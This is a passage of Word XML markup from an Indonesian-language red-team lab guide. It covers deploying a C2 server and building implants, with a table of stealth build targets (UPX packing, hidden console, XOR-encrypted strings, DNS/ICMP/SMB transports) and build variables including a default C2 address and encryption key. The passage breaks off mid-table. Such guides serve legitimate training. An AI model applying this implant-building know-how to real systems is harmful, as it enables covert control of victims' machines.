        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 2.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Deploy C2 Server untuk Lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Buka terminal di mesin C2 server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Set environment variable kunci enkripsi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>export ENCRYPTION_KEY=LabTrainingKey2026</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Jalankan server dengan log debug.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --log-level DEBUG --port 8080</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Verifikasi server berjalan dengan mengakses health endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://localhost:8080/api/v1/health</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Expected: {"success":true,"data":{"status":"healthy",...}}</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Catat IP server — akan digunakan saat build agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Dalam lab, ganti localhost dengan IP mesin server yang dapat diakses dari target VM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 3 — GENERATE IMPLANT (AGENT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Agent adalah binary yang berjalan di mesin target. Build-time variables di-inject melalui Go linker flags (-ldflags), sehingga setiap agent dapat dikonfigurasi dengan server URL, kunci enkripsi, interval beacon, dan berbagai opsi OPSEC yang berbeda tanpa mengubah source code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Makefile Build Targets</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Deskripsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-stealth</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows agent, UPX packed, no console window</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-ws</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan WebSocket transport (latensi rendah)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-dns</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan DNS authoritative transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-doh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan DNS-over-HTTPS transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-icmp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan ICMP echo transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-smb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan SMB named pipe transport</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-encrypted</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent dengan XOR-encrypted strings (anti-strings)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent untuk target Linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Linux x64</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Variabel Build Utama</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Variabel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Default</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Keterangan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C2_SERVER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>http://192.168.10.102:8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>URL server C2 (wajib diubah)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ENC_KEY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SpookyOrcaC2AES1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Kunci enkripsi (harus sama dengan server)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>INTERVAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Beacon interval dalam detik</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>JITTER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Jitter persen (0-100) untuk variasi timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PROFILE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>default</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Malleable HTTP profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>TRANSPORT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>http</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
